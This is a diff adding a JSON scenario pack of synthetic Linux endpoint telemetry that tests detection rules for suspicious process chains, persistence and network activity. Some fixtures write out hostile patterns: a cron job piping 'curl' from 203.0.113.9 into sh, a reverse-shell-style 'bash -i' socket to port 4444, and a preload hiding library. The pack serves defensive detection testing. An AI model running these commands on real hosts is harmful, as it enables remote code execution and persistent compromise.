@@ -1,0 +1,3712 @@
+{
+ "schema_version": "1.0.0",
+ "kind": "scenario-pack",
+ "pack": {
+  "name": "linux-lab",
+  "version": "1.0.0",
+  "description": "Linux endpoint conditions: process relationships, persistence, authentication, network, integrity and coverage gaps (synthetic telemetry)."
+ },
+ "scenarios": [
+  {
+   "id": "SCN-LNX-PRC-001",
+   "title": "Shell started by a web server",
+   "description": "nginx is the direct parent of a bash process owned by the web user.",
+   "objective": "HPRC-001 detects a shell under a network-facing service.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "relationship"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:100:1",
+      "attributes": {
+       "pid": 100,
+       "ppid": 1,
+       "name": "nginx",
+       "exe": "/usr/sbin/nginx",
+       "user": "www-data",
+       "cmdline": "nginx"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:200:1",
+      "attributes": {
+       "pid": 200,
+       "ppid": 100,
+       "name": "bash",
+       "exe": "/usr/bin/bash",
+       "user": "www-data",
+       "cmdline": "bash -c id"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HPRC-001",
+      "count": 1,
+      "severity": {
+       "min": "high",
+       "max": "high"
+      },
+      "confidence": {
+       "min": "low",
+       "max": "medium"
+      },
+      "title_contains": "bash"
+     }
+    ],
+    "telemetry": [
+     {
+      "category": "process",
+      "where": {
+       "field": "process.parent_name",
+       "op": "eq",
+       "value": "nginx"
+      },
+      "count": 1,
+      "description": "the shell's parent is nginx"
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "Process names are matched exactly; a renamed server binary is not recognised."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PRC-002",
+   "title": "Interactive login shell chain",
+   "description": "sshd -> sshd -> bash -> vim for an administrator: the normal shape of a login session.",
+   "objective": "Expected parent-child relationships do not trigger the process rules.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "relationship",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:300:1",
+      "attributes": {
+       "pid": 300,
+       "ppid": 1,
+       "name": "sshd",
+       "exe": "/usr/sbin/sshd",
+       "user": "root",
+       "cmdline": "sshd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:310:1",
+      "attributes": {
+       "pid": 310,
+       "ppid": 300,
+       "name": "sshd",
+       "exe": "/usr/sbin/sshd",
+       "user": "alice",
+       "cmdline": "sshd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:320:1",
+      "attributes": {
+       "pid": 320,
+       "ppid": 310,
+       "name": "bash",
+       "exe": "/usr/bin/bash",
+       "user": "alice",
+       "cmdline": "bash"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:330:1",
+      "attributes": {
+       "pid": 330,
+       "ppid": 320,
+       "name": "vim",
+       "exe": "/usr/bin/vim",
+       "user": "alice",
+       "cmdline": "vim"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HPRC-001",
+     "DR-ANY-HPRC-002",
+     "DR-LNX-HPRC-003"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PRC-003",
+   "title": "Cron job running a maintenance script",
+   "description": "cron starts sh, which starts a backup script from /usr/local/sbin: unusual-looking shells with a legitimate parent.",
+   "objective": "A shell under cron (not a network-facing service) and a script in a protected directory are not flagged.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "relationship",
+    "benign",
+    "admin"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:400:1",
+      "attributes": {
+       "pid": 400,
+       "ppid": 1,
+       "name": "cron",
+       "exe": "/usr/sbin/cron",
+       "user": "root",
+       "cmdline": "cron"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:410:1",
+      "attributes": {
+       "pid": 410,
+       "ppid": 400,
+       "name": "sh",
+       "exe": "/usr/bin/sh",
+       "user": "root",
+       "cmdline": "/bin/sh -c /usr/local/sbin/backup.sh"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:420:1",
+      "attributes": {
+       "pid": 420,
+       "ppid": 410,
+       "name": "tar",
+       "exe": "/usr/bin/tar",
+       "user": "root",
+       "cmdline": "tar czf /srv/backup.tgz /etc"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HPRC-001",
+     "DR-ANY-HPRC-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PRC-004",
+   "title": "Database archive command runs a shell",
+   "description": "PostgreSQL's archive_command makes the server start sh -c to copy WAL segments, a documented administrator-configured behaviour.",
+   "objective": "A legitimate administrative setup that shares the rule's pattern (shell under a database server).",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "relationship",
+    "benign",
+    "known-issue"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:500:1",
+      "attributes": {
+       "pid": 500,
+       "ppid": 1,
+       "name": "postgres",
+       "exe": "/usr/lib/postgresql/15/bin/postgres",
+       "user": "postgres",
+       "cmdline": "postgres"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:510:1",
+      "attributes": {
+       "pid": 510,
+       "ppid": 500,
+       "name": "sh",
+       "exe": "/usr/bin/sh",
+       "user": "postgres",
+       "cmdline": "sh -c cp pg_wal/0001 /var/backups/wal/"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HPRC-001"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "KNOWN ISSUE: DR-ANY-HPRC-001 cannot tell a configured archive_command from a web-shell style child; the rule's own false_positives list names this case."
+   ],
+   "known_issue": {
+    "description": "DR-ANY-HPRC-001 fires on a postgres archive_command shell; no existing condition separates it from a malicious child."
+   }
+  },
+  {
+   "id": "SCN-LNX-PRC-005",
+   "title": "Program running from /dev/shm",
+   "description": "A process named like a kernel thread runs from a hidden directory in /dev/shm.",
+   "objective": "HPRC-002 flags an executable in a temporary location, including a misleading name.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "executable"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:600:1",
+      "attributes": {
+       "pid": 600,
+       "ppid": 1,
+       "name": "kworker",
+       "exe": "/dev/shm/.x/kworker",
+       "user": "www-data",
+       "cmdline": "/dev/shm/.x/kworker"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HPRC-002",
+      "count": 1,
+      "severity": {
+       "min": "medium",
+       "max": "medium"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "The rule sees the path, not the file: a copy in a protected directory is not flagged."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PRC-006",
+   "title": "Build running from /tmp",
+   "description": "A developer's make build runs a compiled test binary from /tmp/build-1234.",
+   "objective": "A legitimate use of a temporary directory that shares the rule's pattern.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "executable",
+    "benign",
+    "known-issue"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:700:1",
+      "attributes": {
+       "pid": 700,
+       "ppid": 1,
+       "name": "make",
+       "exe": "/usr/bin/make",
+       "user": "dev",
+       "cmdline": "make"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:710:1",
+      "attributes": {
+       "pid": 710,
+       "ppid": 700,
+       "name": "unit-tests",
+       "exe": "/tmp/build-1234/unit-tests",
+       "user": "dev",
+       "cmdline": "unit-tests"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HPRC-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "KNOWN ISSUE: DR-ANY-HPRC-002 cannot tell a build tree in /tmp from a staged payload."
+   ],
+   "known_issue": {
+    "description": "DR-ANY-HPRC-002 fires on a developer's build binary in /tmp; the rule lists build tools among its benign causes."
+   }
+  },
+  {
+   "id": "SCN-LNX-PRC-007",
+   "title": "Process whose executable was deleted",
+   "description": "A long-running process reports an executable that no longer exists on disk.",
+   "objective": "LNX-HPRC-003 flags a running program with a deleted executable.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "executable"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:800:1",
+      "attributes": {
+       "pid": 800,
+       "ppid": 1,
+       "name": "agent",
+       "exe": "/tmp/agent",
+       "user": "www-data",
+       "cmdline": "agent",
+       "exe_deleted": true
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-LNX-HPRC-003",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "A package upgrade also leaves processes on replaced binaries; the rule is an indicator, not a conclusion."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PRC-008",
+   "title": "Ordinary processes with existing executables",
+   "description": "Services running from package directories with intact executables.",
+   "objective": "Expected executable metadata does not trigger the deleted-executable rule.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "executable",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:810:1",
+      "attributes": {
+       "pid": 810,
+       "ppid": 1,
+       "name": "sshd",
+       "exe": "/usr/sbin/sshd",
+       "user": "root",
+       "cmdline": "sshd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:820:1",
+      "attributes": {
+       "pid": 820,
+       "ppid": 1,
+       "name": "cron",
+       "exe": "/usr/sbin/cron",
+       "user": "root",
+       "cmdline": "cron",
+       "exe_deleted": false
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-LNX-HPRC-003",
+     "DR-ANY-HPRC-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PRC-009",
+   "title": "Reverse shell pattern",
+   "description": "A bash process owns an established connection to an external address; the process and the socket agree on the pid.",
+   "objective": "HPRC-004 correlates a shell with an external socket.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "network",
+    "correlation"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:900:1",
+      "attributes": {
+       "pid": 900,
+       "ppid": 1,
+       "name": "bash",
+       "exe": "/usr/bin/bash",
+       "user": "www-data",
+       "cmdline": "bash -i"
+      }
+     },
+     {
+      "category": "network_connection",
+      "key": "c:900:203.0.113.9:4444",
+      "attributes": {
+       "protocol": "tcp",
+       "state": "established",
+       "local_address": "10.0.0.5",
+       "local_port": 40900,
+       "remote_address": "203.0.113.9",
+       "remote_port": 4444,
+       "pid": 900,
+       "process": "bash"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HPRC-004",
+      "count": 1,
+      "severity": {
+       "min": "high",
+       "max": "high"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "Correlation is by pid at collection time; pid reuse between the process and socket reads could create a false pairing."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PRC-010",
+   "title": "Shell with only internal connections",
+   "description": "An administrator's shell on a jump host holds a connection to an internal address.",
+   "objective": "Internal connections do not satisfy the external-socket condition.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "network",
+    "benign",
+    "admin"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:910:1",
+      "attributes": {
+       "pid": 910,
+       "ppid": 1,
+       "name": "bash",
+       "exe": "/usr/bin/bash",
+       "user": "alice",
+       "cmdline": "bash"
+      }
+     },
+     {
+      "category": "network_connection",
+      "key": "c:910:10.0.0.9:22",
+      "attributes": {
+       "protocol": "tcp",
+       "state": "established",
+       "local_address": "10.0.0.5",
+       "local_port": 40910,
+       "remote_address": "10.0.0.9",
+       "remote_port": 22,
+       "pid": 910,
+       "process": "bash"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HPRC-004",
+     "DR-ANY-HNET-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PRC-011",
+   "title": "Process ownership information missing",
+   "description": "The collector could not read process owners (unprivileged run): coverage is partial and no process matches the rule.",
+   "objective": "A rule that depends on process telemetry must say it cannot conclude, not report a clean result.",
+   "kind": "coverage",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "process",
+    "coverage",
+    "permissions"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:50:1",
+      "attributes": {
+       "pid": 50,
+       "ppid": 1,
+       "name": "sleep",
+       "exe": null,
+       "user": null,
+       "cmdline": null
+      },
+      "unknown_attributes": [
+       "exe",
+       "user",
+       "cmdline"
+      ]
+     }
+    ],
+    "coverage": {
+     "process": "partial"
+    }
+   },
+   "expect": {
+    "indeterminate": [
+     {
+      "rule": "DR-ANY-HPRC-001",
+      "reason_contains": "partial"
+     }
+    ],
+    "coverage": {
+     "process": "partial"
+    }
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "Partial coverage with no match is treated as inconclusive; a partial run that did find a match is reported with lowered confidence instead."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-001",
+   "title": "Service running from /tmp",
+   "description": "A systemd unit executes a program under /tmp.",
+   "objective": "HSVC-001 flags a service in a user-writable location.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "service"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "service",
+      "key": "service:updater.service",
+      "attributes": {
+       "name": "updater.service",
+       "path": "/tmp/.u/updater",
+       "start_mode": "yes"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HSVC-001",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-002",
+   "title": "Packaged system service",
+   "description": "ssh.service and cron.service run from /usr/sbin.",
+   "objective": "Legitimate startup configuration is not flagged.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "service",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "service",
+      "key": "service:ssh.service",
+      "attributes": {
+       "name": "ssh.service",
+       "path": "/usr/sbin/sshd -D"
+      }
+     },
+     {
+      "category": "service",
+      "key": "service:cron.service",
+      "attributes": {
+       "name": "cron.service",
+       "path": "/usr/sbin/cron -f"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HSVC-001"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "Unit definitions only; runtime state is not part of the telemetry."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-003",
+   "title": "Cron job that pipes a download into a shell",
+   "description": "A cron.d entry fetches a script and runs it in one command.",
+   "objective": "HTSK-001 flags a download-and-execute scheduled job.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "scheduled-task"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/update",
+      "attributes": {
+       "name": "/etc/cron.d/update",
+       "command": "* * * * * root curl -s http://203.0.113.9/x.sh | sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HTSK-001",
+      "count": 1,
+      "severity": {
+       "min": "high"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-004",
+   "title": "Standard logrotate job",
+   "description": "The packaged daily logrotate task.",
+   "objective": "A legitimate scheduled task is not flagged by either task rule.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "scheduled-task",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.daily/logrotate",
+      "attributes": {
+       "name": "/etc/cron.daily/logrotate",
+       "command": "/usr/sbin/logrotate /etc/logrotate.conf",
+       "user": "root"
+      },
+      "scope": "cron"
+     },
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/sysstat",
+      "attributes": {
+       "name": "/etc/cron.d/sysstat",
+       "command": "5-55/10 * * * * root /usr/lib/sysstat/debian-sa1 1 1",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HTSK-001",
+     "DR-ANY-HTSK-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-005",
+   "title": "Root job running a script from /home",
+   "description": "A root cron entry runs a script that any user with a home directory could replace.",
+   "objective": "HTSK-002 flags privileged execution of a user-writable file.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "scheduled-task",
+    "privilege"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/report",
+      "attributes": {
+       "name": "/etc/cron.d/report",
+       "command": "*/10 * * * * root /home/alice/report.sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HTSK-002",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-006",
+   "title": "Unprivileged job in a home directory",
+   "description": "alice's own crontab runs her script.",
+   "objective": "An unprivileged job in a user directory is not a privilege problem.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "scheduled-task",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/var/spool/cron/alice",
+      "attributes": {
+       "name": "/var/spool/cron/alice",
+       "command": "0 * * * * /home/alice/sync.sh",
+       "user": "alice"
+      },
+      "scope": "cron"
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HTSK-002",
+     "DR-ANY-HTSK-001"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-007",
+   "title": "ld.so.preload configured",
+   "description": "/etc/ld.so.preload lists a library.",
+   "objective": "LNX-HPER-001 flags a populated preload file.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "configuration"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "persistence",
+      "key": "per:ld_preload:/etc/ld.so.preload",
+      "attributes": {
+       "mechanism": "ld_preload",
+       "location": "/etc/ld.so.preload",
+       "value": "/usr/lib/libhide.so"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-LNX-HPER-001",
+      "count": 1,
+      "severity": {
+       "min": "high"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-008",
+   "title": "Unexpected startup configuration (rc.local)",
+   "description": "rc.local launches a program from /tmp at boot.",
+   "objective": "HPER-002 flags an autostart entry in a writable location.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "configuration"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "persistence",
+      "key": "per:rc_local:/etc/rc.local",
+      "attributes": {
+       "mechanism": "rc_local",
+       "location": "/etc/rc.local",
+       "value": "/tmp/boot.sh &"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HPER-002",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-009",
+   "title": "Legitimate startup configuration",
+   "description": "An empty preload file, an rc.local that only exits, and a packaged profile.d script.",
+   "objective": "Expected startup configuration is not flagged.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "configuration",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "persistence",
+      "key": "p1",
+      "attributes": {
+       "mechanism": "ld_preload",
+       "location": "/etc/ld.so.preload",
+       "value": null
+      },
+      "unknown_attributes": [
+       "value"
+      ]
+     },
+     {
+      "category": "persistence",
+      "key": "per:rc_local:/etc/rc.local",
+      "attributes": {
+       "mechanism": "rc_local",
+       "location": "/etc/rc.local",
+       "value": "/usr/local/bin/hostname-init"
+      }
+     },
+     {
+      "category": "persistence",
+      "key": "per:profile_script:/etc/profile.d/locale.sh",
+      "attributes": {
+       "mechanism": "profile_script",
+       "location": "/etc/profile.d/locale.sh",
+       "value": "export LANG=C.UTF-8"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-LNX-HPER-001",
+     "DR-ANY-HPER-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-PER-010",
+   "title": "New service registered since the baseline",
+   "description": "A service exists that the known-good baseline did not have.",
+   "objective": "HCHG-002 reports a new service as an unusual change to review.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "service",
+    "change"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "service",
+      "key": "service:ssh.service",
+      "attributes": {
+       "name": "ssh.service",
+       "path": "/usr/sbin/sshd -D"
+      }
+     },
+     {
+      "category": "service",
+      "key": "service:metrics.service",
+      "attributes": {
+       "name": "metrics.service",
+       "path": "/opt/metrics/bin/exporter"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HCHG-002",
+      "count": 1,
+      "severity": {
+       "max": "low"
+      },
+      "confidence": {
+       "min": "medium"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
